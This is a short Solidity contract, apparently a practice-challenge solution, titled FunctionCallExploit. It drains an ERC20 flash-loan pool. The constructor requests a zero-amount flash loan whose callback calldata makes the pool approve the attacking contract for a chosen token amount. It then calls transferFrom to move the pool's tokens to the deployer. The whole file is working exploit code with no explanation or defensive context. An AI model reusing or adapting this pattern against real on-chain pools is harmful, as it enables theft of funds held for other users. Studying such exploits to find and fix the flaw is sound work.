// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMyERC20Pool2 {
    function flashLoanExecute(
        uint256 toBorrow,
        address client,
        address addr,
        bytes calldata cdata
    ) external;
}

contract FunctionCallExploit {
    constructor(address _poolAddr, uint tokenAmount, address _tokenAddr) {
        IMyERC20Pool2 myPool = IMyERC20Pool2(_poolAddr);
        myPool.flashLoanExecute(
            0,
            address(this),
            _tokenAddr,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                tokenAmount
            )
        );
        IERC20 myToken = IERC20(_tokenAddr);
        myToken.transferFrom(_poolAddr, msg.sender, tokenAmount);
    }
}
